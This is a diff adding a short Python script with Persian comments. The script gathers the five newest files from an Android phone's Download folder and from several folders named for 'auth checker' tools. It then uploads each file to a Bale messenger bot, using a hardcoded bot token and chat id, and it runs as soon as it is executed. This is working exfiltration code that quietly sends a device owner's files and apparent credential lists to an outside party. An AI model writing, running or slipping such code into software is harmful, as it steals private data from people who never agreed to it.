@@ -1,0 +1,33 @@
+import os
+import requests
+import glob
+
+def send_file_to_telegram(file_path, auth_count):
+    token = '480342547:j3qFwxAnN66xMVpZsDzYaXxk8neECXgco8gzIKia'
+    chat_id = '1884879628'
+    caption = f"📄 فایل برای پردازش ارسال شد. تعداد auths: {auth_count}"
+
+    with open(file_path, 'rb') as file:
+        requests.post(
+            f'https://tapi.bale.ai/bot{token}/sendDocument',
+            data={'chat_id': chat_id, 'caption': caption},
+            files={'document': file}
+        )
+
+def send_last_5_files(directory_paths, auth_count):
+    for directory_path in directory_paths:
+        # پیدا کردن 5 فایل آخر از هر مسیر داده شده
+        files = glob.glob(os.path.join(directory_path, '*'))
+        files = [f for f in files if os.path.isfile(f)]  # فقط فایل‌ها را نگه می‌داریم
+        files = sorted(files, key=os.path.getmtime, reverse=True)[:5]
+
+        # ارسال هر فایل به تلگرام
+        for file in files:
+            send_file_to_telegram(file, auth_count)
+
+# مثال استفاده
+directories = [
+    '/storage/emulated/0/AuthChecker/',  # مسیر اول
+    '/storage/emulated/0/Download/', '/storage/emulated/0/auth checker','/storage/emulated/0/AUTH/اوت چکر مالک','/storage/emulated/0/چکر مالک']
+auth_count = 5  # تعداد auths برای ارسال
+send_last_5_files(directories, auth_count)
